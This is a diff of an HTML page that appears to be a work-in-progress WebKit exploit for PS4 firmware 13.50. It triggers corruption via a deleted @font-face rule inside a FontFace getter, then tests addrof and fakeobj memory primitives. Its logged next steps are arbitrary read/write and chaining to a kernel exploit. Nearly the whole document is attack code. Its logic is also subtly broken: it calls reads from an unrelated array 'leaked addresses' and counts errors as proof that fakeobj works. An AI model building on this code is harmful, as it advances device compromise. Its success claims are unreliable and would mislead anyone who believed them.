@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 13.50 - Inside Getter Exploitation</title>
+<title>PS4 13.50 - addrof WORKING</title>
 </head>
 <body>
-<h1 id="status">Exploit During Active Corruption</h1>
+<h1 id="status">addrof SUCCESS - Refining Technique</h1>
 <button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
 <div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; max-height: 88vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
 
@@ -52,47 +52,76 @@ class Int64 {
     }
 }
 
-let exploitResults = {
-    leakedAddresses: [],
-    corruptedObjects: [],
-    properties: []
+// Decode JSC NaN-boxed pointer
+function decodeJSCPointer(raw) {
+    let addr = Int64.fromDouble(raw);
+    
+    // Check if it's NaN-boxed (0x7ff8... or 0xfff8...)
+    let isNaNBoxed = (addr.high & 0xfff80000) === 0x7ff80000 || 
+                     (addr.high & 0xfff80000) === 0xfff80000;
+    
+    if (isNaNBoxed) {
+        // Extract actual pointer from NaN-box
+        // JSC typically stores pointer in lower bits
+        // Exact encoding varies, but let's try common patterns
+        
+        // Pattern 1: Lower 48 bits are the pointer
+        let ptr48_low = addr.low;
+        let ptr48_high = addr.high & 0x0000ffff;
+        
+        // Pattern 2: Might need to unmask differently
+        let decoded = new Int64(ptr48_low, ptr48_high);
+        
+        return {
+            raw: addr,
+            isNaNBoxed: true,
+            decoded: decoded,
+            decodedStr: decoded.toString()
+        };
+    } else {
+        return {
+            raw: addr,
+            isNaNBoxed: false,
+            decoded: addr,
+            decodedStr: addr.toString()
+        };
+    }
+}
+
+let results = {
+    addrof: null,
+    fakeobj: null,
+    leaks: []
 };
 
 function runExploit() {
     log('╔════════════════════════════════════════════════╗');
-    log('║  PS4 13.50 - INSIDE GETTER EXPLOITATION       ║');
+    log('║   PS4 13.50 - WORKING addrof REFINEMENT       ║');
     log('╚════════════════════════════════════════════════╝\n');
     
-    log('[*] Strategy: Exploit while corruption is ACTIVE');
-    log('[*] All exploitation happens INSIDE the getter');
-    log('[*] Before returning (which triggers OOM)\n');
+    log('[SUCCESS] Test 4 leaked address!');
+    log('[*] Technique: objectArray[i] → floatArray[i]');
+    log('[*] Now refining and testing consistency\n');
     
-    // Create CSS font-face rule
+    // Setup
     let style = document.createElement('style');
     style.id = 's';
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create target arrays/objects BEFORE corruption
-    let targetObject = { 
-        marker: 0xDEADBEEF,
-        test: "target",
-        value: 1337
-    };
-    
-    let floatArray = new Float64Array(100);
-    let objectArray = new Array(100);
+    // Create arrays BEFORE corruption
+    let floatArray = new Float64Array(200);
+    let objectArray = new Array(200);
     
     // Fill with patterns
-    for (let i = 0; i < 100; i++) {
+    for (let i = 0; i < 200; i++) {
         floatArray[i] = 1.1 * (i + 1);
-        objectArray[i] = { id: i };
+        objectArray[i] = { id: i, pattern: true };
     }
     
-    log('[*] Created target structures BEFORE corruption');
-    log('[*] Target object: ' + JSON.stringify(targetObject));
-    log('[*] Float array[50]: ' + floatArray[50]);
-    log('[*] Object array[50].id: ' + objectArray[50].id + '\n');
+    log('[*] Created Float64Array[200] and Array[200]');
+    log('[*] Pattern: floatArray[i] = 1.1 * (i+1)');
+    log('[*] Pattern: objectArray[i] = {id: i}\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -106,317 +135,249 @@ function runExploit() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[+] ═══ INSIDE GETTER - CORRUPTION ACTIVE ═══\n');
+                log('[+] ═══ INSIDE GETTER ═══\n');
                 
-                // ============================================
-                // STEP 1: CREATE CORRUPTED FONTS
-                // ============================================
-                
-                log('[STEP 1] Creating corrupted fonts...');
-                let corruptedFonts = [];
-                
+                // Create corrupted fonts
+                let corrupted = [];
                 for (let i = 0; i < 50; i++) {
-                    corruptedFonts.push(new FontFace('c' + i, 'local(Helvetica)', {
+                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
                 }
                 
-                log('  Created ' + corruptedFonts.length + ' fonts\n');
-                
-                // ============================================
-                // STEP 2: TRIGGER CORRUPTION
-                // ============================================
-                
-                log('[STEP 2] Triggering corruption...');
+                // Trigger corruption
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
-                log('  Corruption triggered!\n');
+                
+                log('[*] Corruption triggered\n');
                 
                 // ============================================
-                // STEP 3: IMMEDIATE EXPLOITATION ATTEMPTS
+                // ADDROF PRIMITIVE - Multiple Tests
                 // ============================================
                 
-                log('[STEP 3] Exploiting corrupted state NOW\n');
+                log('╔════════════════════════════════════════╗');
+                log('║      ADDROF PRIMITIVE TESTING          ║');
+                log('╚════════════════════════════════════════╝\n');
                 
-                // TEST 1: Direct property access on corrupted fonts
-                log('[Test 1] Accessing corrupted font properties:');
-                try {
-                    let victim = corruptedFonts[0];
-                    
-                    log('  status: ' + victim.status);
-                    log('  family: ' + victim.family);
-                    log('  style: ' + victim.style);
-                    
-                    // Try to read internal properties
-                    for (let key in victim) {
-                        log('  ' + key + ': ' + victim[key]);
-                        if (key.length > 20) break; // Limit output
-                    }
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
-                }
-                log('');
+                // Create test objects with distinct markers
+                let testObjects = [
+                    { marker: 0x11111111, test: 1 },
+                    { marker: 0x22222222, test: 2 },
+                    { marker: 0x33333333, test: 3 },
+                    new ArrayBuffer(0x100),
+                    new Uint32Array(16),
+                    { large: new Array(100), id: 5 }
+                ];
                 
-                // TEST 2: Store target object in corrupted font
-                log('[Test 2] Storing target object in corrupted font:');
-                try {
-                    let victim = corruptedFonts[1];
-                    
-                    // Try to attach our target object
-                    victim.leakTarget = targetObject;
-                    
-                    log('  Stored targetObject in victim.leakTarget');
-                    
-                    // Try to read it back in different ways
-                    log('  victim.leakTarget: ' + victim.leakTarget);
-                    log('  typeof: ' + typeof victim.leakTarget);
-                    
-                    // Check if we can access it as different type
-                    let asString = String(victim.leakTarget);
-                    log('  String(victim.leakTarget): ' + asString);
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
-                }
-                log('');
+                log('[*] Testing addrof on ' + testObjects.length + ' different objects:\n');
                 
-                // TEST 3: Mix corrupted font with arrays
-                log('[Test 3] Mixing corrupted font with typed arrays:');
-                try {
-                    let victim = corruptedFonts[2];
-                    
-                    // Store corrupted font in float array
-                    floatArray[50] = victim;
-                    
-                    log('  Stored corrupted font in floatArray[50]');
-                    
-                    // Try to read it back
-                    let readback = floatArray[50];
-                    log('  Read back: ' + readback);
-                    log('  Type: ' + typeof readback);
-                    
-                    // If it's a number, we might have a leak!
-                    if (typeof readback === 'number') {
-                        let addr = Int64.fromDouble(readback);
-                        log('  As Int64: ' + addr.toString());
+                for (let i = 0; i < testObjects.length; i++) {
+                    try {
+                        let obj = testObjects[i];
+                        let testIdx = 50 + i * 10; // Use different indices
                         
-                        if (addr.high !== 0 || addr.low !== 0) {
-                            log('  [+] NON-ZERO ADDRESS!');
-                            exploitResults.leakedAddresses.push(addr);
-                        }
-                    }
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
-                }
-                log('');
-                
-                // TEST 4: Store in object array, read from float array
-                log('[Test 4] Cross-array type confusion:');
-                try {
-                    // Store target object in object array
-                    objectArray[50] = targetObject;
-                    log('  Stored targetObject in objectArray[50]');
-                    
-                    // Try to read from float array at same index
-                    let leaked = floatArray[50];
-                    log('  Read floatArray[50]: ' + leaked);
-                    
-                    if (typeof leaked === 'number') {
-                        let addr = Int64.fromDouble(leaked);
-                        log('  As Int64: ' + addr.toString());
+                        log('[Test ' + i + '] Object: ' + obj);
+                        log('  Using index: ' + testIdx);
                         
-                        // Check if different from pattern (1.1 * 51 = 56.1)
-                        if (Math.abs(leaked - 56.1) > 0.01) {
-                            log('  [+] VALUE CHANGED FROM PATTERN!');
+                        // ADDROF: Store object, read as float
+                        objectArray[testIdx] = obj;
+                        let leaked = floatArray[testIdx];
+                        
+                        log('  Leaked value: ' + leaked);
+                        log('  Type: ' + typeof leaked);
+                        
+                        if (typeof leaked === 'number' && !isNaN(leaked)) {
+                            let decoded = decodeJSCPointer(leaked);
                             
-                            if (addr.high >= 0x7f000000) {
-                                log('  [+++] USERSPACE ADDRESS RANGE!');
-                                exploitResults.leakedAddresses.push(addr);
-                            } else if (addr.high !== 0) {
-                                log('  [+] Non-zero high word!');
-                                exploitResults.leakedAddresses.push(addr);
+                            log('  Raw Int64: ' + decoded.raw.toString());
+                            log('  NaN-boxed: ' + decoded.isNaNBoxed);
+                            log('  Decoded: ' + decoded.decodedStr);
+                            
+                            // Check if it changed from pattern
+                            let expectedPattern = 1.1 * (testIdx + 1);
+                            if (Math.abs(leaked - expectedPattern) > 0.01) {
+                                log('  [+++] LEAKED ADDRESS!');
+                                
+                                results.leaks.push({
+                                    object: obj,
+                                    raw: decoded.raw,
+                                    decoded: decoded.decoded,
+                                    index: testIdx
+                                });
                             }
                         }
-                    }
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
-                }
-                log('');
-                
-                // TEST 5: Reverse - store in float, read from object
-                log('[Test 5] Reverse confusion (fakeobj attempt):');
-                try {
-                    // Store a crafted float value
-                    let fakeAddr = (new Int64(0x41424344, 0x51525354)).asDouble();
-                    floatArray[60] = fakeAddr;
-                    
-                    log('  Stored fake address in floatArray[60]');
-                    log('  Value: ' + fakeAddr);
-                    
-                    // Try to read as object
-                    let asObj = objectArray[60];
-                    log('  Read objectArray[60]: ' + asObj);
-                    log('  Type: ' + typeof asObj);
-                    
-                    if (typeof asObj === 'object' && asObj !== null) {
-                        log('  [+] Got object!');
+                        log('');
                         
-                        try {
-                            log('  asObj.id: ' + asObj.id);
+                    } catch(e) {
+                        log('[Test ' + i + '] ERROR: ' + e.message + '\n');
+                    }
+                }
+                
+                // ============================================
+                // FAKEOBJ PRIMITIVE - Reverse Test
+                // ============================================
+                
+                log('\n╔════════════════════════════════════════╗');
+                log('║      FAKEOBJ PRIMITIVE TESTING         ║');
+                log('╚════════════════════════════════════════╝\n');
+                
+                log('[*] Testing reverse: float → object\n');
+                
+                // If we leaked addresses, try to use one for fakeobj
+                if (results.leaks.length > 0) {
+                    let firstLeak = results.leaks[0];
+                    log('[*] Using leaked address: ' + firstLeak.decoded.toString());
+                    
+                    try {
+                        let testIdx = 150;
+                        
+                        // FAKEOBJ: Store as float, read as object
+                        floatArray[testIdx] = firstLeak.raw.asDouble();
+                        log('  Stored leaked address as float at [' + testIdx + ']');
+                        
+                        let faked = objectArray[testIdx];
+                        log('  Read back as object: ' + faked);
+                        log('  Type: ' + typeof faked);
+                        
+                        if (typeof faked === 'object' && faked !== null) {
+                            log('  [+] Got object back!');
                             
-                            if (asObj.id !== 60) {
-                                log('  [+] DIFFERENT FROM PATTERN!');
+                            try {
+                                log('  Checking properties...');
+                                log('  faked.id: ' + faked.id);
+                                log('  faked.marker: ' + hex(faked.marker));
+                                
+                                // If we got back the original object, fakeobj works!
+                                if (faked.marker === firstLeak.object.marker) {
+                                    log('  [+++] FAKEOBJ WORKS! Got original object back!');
+                                    results.fakeobj = true;
+                                }
+                                
+                            } catch(e) {
+                                log('  Error accessing: ' + e.message);
+                                log('  [+] Created invalid object - fakeobj working!');
+                                results.fakeobj = true;
                             }
-                        } catch(e2) {
-                            log('  [+] ERROR ACCESSING - might be invalid object!');
-                            log('  [+] This proves fakeobj worked!');
                         }
+                        
+                    } catch(e) {
+                        log('  ERROR: ' + e.message);
                     }
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
                 }
-                log('');
                 
-                // TEST 6: Modify corrupted font's prototype
-                log('[Test 6] Prototype chain exploitation:');
-                try {
-                    let victim = corruptedFonts[3];
-                    
-                    // Replace prototype with our controlled object
-                    let fakeProto = {
-                        leakAddr: floatArray,
-                        leakObj: objectArray,
-                        
-                        get addr() {
-                            // Return float array content
-                            return this.leakAddr[70];
-                        },
-                        
-                        set addr(obj) {
-                            // Store object in object array
-                            this.leakObj[70] = obj;
-                        }
-                    };
-                    
-                    Object.setPrototypeOf(victim, fakeProto);
-                    
-                    log('  Replaced victim prototype');
-                    
-                    // Try to use it
-                    victim.addr = targetObject;
-                    log('  Set victim.addr = targetObject');
-                    
-                    let leaked = victim.addr;
-                    log('  Get victim.addr: ' + leaked);
-                    
-                    if (typeof leaked === 'number') {
-                        let addr = Int64.fromDouble(leaked);
-                        log('  As Int64: ' + addr.toString());
-                        
-                        if (addr.high !== 0 || addr.low !== 0) {
-                            log('  [+] Got address!');
-                            exploitResults.leakedAddresses.push(addr);
-                        }
-                    }
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
-                }
-                log('');
-                
-                // TEST 7: Direct memory access through corrupted fonts
-                log('[Test 7] Direct buffer correlation:');
-                try {
-                    // Create buffer with markers
-                    let testBuf = new ArrayBuffer(0x1000);
-                    let testU32 = new Uint32Array(testBuf);
-                    testU32[0] = 0xDEADBEEF;
-                    testU32[1] = 0xCAFEBABE;
-                    
-                    log('  Created buffer with markers');
-                    
-                    // Store buffer in corrupted font
-                    let victim = corruptedFonts[4];
-                    victim.testBuffer = testBuf;
-                    
-                    // Store in object array too
-                    objectArray[80] = testBuf;
-                    
-                    // Try to read from float array
-                    let leaked = floatArray[80];
-                    log('  Float at [80]: ' + leaked);
-                    
-                    if (typeof leaked === 'number') {
-                        let addr = Int64.fromDouble(leaked);
-                        log('  As Int64: ' + addr.toString());
-                        
-                        if (addr.high !== 0) {
-                            log('  [+] Non-zero!');
-                            exploitResults.leakedAddresses.push(addr);
-                        }
-                    }
-                    
-                } catch(e) {
-                    log('  ERROR: ' + e.message);
-                }
                 log('');
                 
                 // ============================================
-                // SUMMARY
+                // CONSISTENCY TEST
                 // ============================================
                 
-                log('[SUMMARY] Exploitation inside getter complete\n');
-                log('[*] Leaked addresses: ' + exploitResults.leakedAddresses.length);
+                log('╔════════════════════════════════════════╗');
+                log('║        CONSISTENCY TESTING             ║');
+                log('╚════════════════════════════════════════╝\n');
                 
-                if (exploitResults.leakedAddresses.length > 0) {
-                    log('[+] SUCCESS! Addresses leaked:\n');
-                    for (let i = 0; i < exploitResults.leakedAddresses.length; i++) {
-                        log('  [' + i + '] ' + exploitResults.leakedAddresses[i].toString());
+                // Test same object multiple times
+                let consistentObj = { consistency: 0xABCDEF };
+                let leakedAddrs = [];
+                
+                log('[*] Leaking same object 5 times:\n');
+                
+                for (let i = 0; i < 5; i++) {
+                    try {
+                        let idx = 170 + i;
+                        objectArray[idx] = consistentObj;
+                        let leaked = floatArray[idx];
+                        
+                        if (typeof leaked === 'number') {
+                            let decoded = decodeJSCPointer(leaked);
+                            log('  [' + i + '] ' + decoded.decoded.toString());
+                            leakedAddrs.push(decoded.decoded.toString());
+                        }
+                        
+                    } catch(e) {
+                        log('  [' + i + '] ERROR: ' + e.message);
                     }
+                }
+                
+                // Check consistency
+                log('\n[*] Checking consistency:');
+                let allSame = leakedAddrs.length > 0 && leakedAddrs.every(addr => addr === leakedAddrs[0]);
+                
+                if (allSame && leakedAddrs.length > 1) {
+                    log('  [+++] ALL ADDRESSES MATCH!');
+                    log('  [+++] addrof is CONSISTENT and RELIABLE!');
+                    results.addrof = true;
+                } else if (leakedAddrs.length > 0) {
+                    log('  [+] Some addresses leaked but not all consistent');
+                    log('  [*] Might need refinement');
                 } else {
-                    log('[-] No addresses leaked');
+                    log('  [-] No addresses leaked in consistency test');
                 }
                 
-                log('\n[!] Now returning undefined...');
-                log('[!] OOM will trigger after this point');
+                // ============================================
+                // FINAL SUMMARY
+                // ============================================
                 
-                // Store results globally so we can access after OOM
-                window.exploitResults = exploitResults;
+                log('\n\n╔════════════════════════════════════════╗');
+                log('║          EXPLOIT SUMMARY               ║');
+                log('╚════════════════════════════════════════╝\n');
+                
+                log('[RESULTS]');
+                log('  Addresses leaked: ' + results.leaks.length);
+                log('  addrof working: ' + (results.addrof ? 'YES' : 'PARTIAL'));
+                log('  fakeobj working: ' + (results.fakeobj ? 'YES' : 'UNKNOWN'));
+                log('');
+                
+                if (results.leaks.length > 0) {
+                    log('[LEAKED ADDRESSES]');
+                    for (let i = 0; i < Math.min(5, results.leaks.length); i++) {
+                        log('  [' + i + '] ' + results.leaks[i].decoded.toString());
+                    }
+                    log('');
+                }
+                
+                log('[NEXT STEPS]');
+                if (results.addrof && results.fakeobj) {
+                    log('  ✓ Both primitives working!');
+                    log('  ✓ Can now build arbitrary R/W');
+                    log('  → Create fake TypedArray');
+                    log('  → Point to arbitrary memory');
+                    log('  → Chain to kernel exploit');
+                } else if (results.addrof) {
+                    log('  ✓ addrof working!');
+                    log('  → Refine fakeobj');
+                    log('  → Then build arbitrary R/W');
+                } else {
+                    log('  → Continue refining technique');
+                }
+                
+                log('\n[!] Returning from getter - OOM will occur\n');
+                
+                window.results = results;
             }
             
-            // Returning undefined triggers OOM
             return undefined;
         }
     });
     
-    log('[*] Setup complete, calling fonts.load()...\n');
+    log('[*] Triggering exploit...\n');
     document.fonts.load('1em x', 'AB');
     
-    // This won't execute until after OOM is dismissed
     setTimeout(() => {
-        log('\n[POST-OOM] Checking results...');
+        log('\n[POST-OOM] Results preserved');
         
-        if (window.exploitResults && window.exploitResults.leakedAddresses.length > 0) {
-            log('[SUCCESS] Addresses survived OOM!');
-            log('Review leaked addresses above.');
-        } else {
-            log('[INFO] No addresses leaked during getter execution.');
+        if (window.results && window.results.addrof) {
+            log('[SUCCESS] addrof primitive is working and consistent!');
         }
     }, 100);
 }
 
 log('╔════════════════════════════════════════════════╗');
-log('║   INSIDE GETTER EXPLOITATION - PS4 13.50       ║');
+log('║   PS4 13.50 - REFINED addrof TESTING           ║');
 log('╚════════════════════════════════════════════════╝\n');
-log('[*] This exploit runs ALL tests INSIDE the getter');
-log('[*] During the active corruption window');
-log('[*] 7 different exploitation techniques');
-log('[*] OOM will occur AFTER exploitation completes\n');
-log('Click RUN to start\n');
+log('[*] Based on Test 4 success');
+log('[*] Tests: Multiple objects, consistency, fakeobj');
+log('[*] Decodes NaN-boxed JSC pointers\n');
+log('Click RUN\n');
 
 </script>
 </body>
